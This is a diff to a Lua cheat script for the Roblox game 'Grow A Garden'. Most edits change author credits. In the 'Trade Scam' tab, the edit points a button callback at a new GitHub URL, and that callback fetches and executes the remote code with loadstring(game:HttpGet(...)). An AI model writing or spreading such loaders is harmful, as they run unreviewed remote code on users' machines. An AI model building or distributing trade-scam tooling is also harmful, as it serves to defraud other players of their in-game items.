@@ -396,7 +396,7 @@ until Confirmed
 local Window =
     WindUI:CreateWindow(
     {
-        Title = "PhantomHub | Made by Code phantom aka mystery man",
+        Title = "PhantomHub | Made by Code phantom aka mystery man/nothing boy good",
         Icon = "sparkles",
         IconThemed = true,
         Author = "Grow A Garden",
@@ -762,7 +762,7 @@ Tabs.EggTab:Button(
 Tabs.EggESPTab:Paragraph(
     {
         Title = "Egg ESP System",
-        Desc = "Visual pet prediction system for your eggs | Made by Code phantom aka ?",
+        Desc = "Visual pet prediction system for your eggs | Made by Code phantom aka ?/nothingboygood",
         Image = "eye",
         Color = "Red"
     }
@@ -894,7 +894,7 @@ Tabs.TradeScamTab:Paragraph(
 
 Tabs.TradeScamTab:Button(
     {
-        Title = "Load Trade Scam",
+        Title = "Load Trade Scam(not released yet",
         Icon = "shield-alert",
         Callback = function()
             WindUI:Notify(
@@ -907,7 +907,7 @@ Tabs.TradeScamTab:Button(
             )
             
             local success, error = pcall(function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/Spv-Script/Grow-Garden/refs/heads/main/Spawner"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting/refs/heads/main/Spawner.txt"))()
             end)
             
             if success then
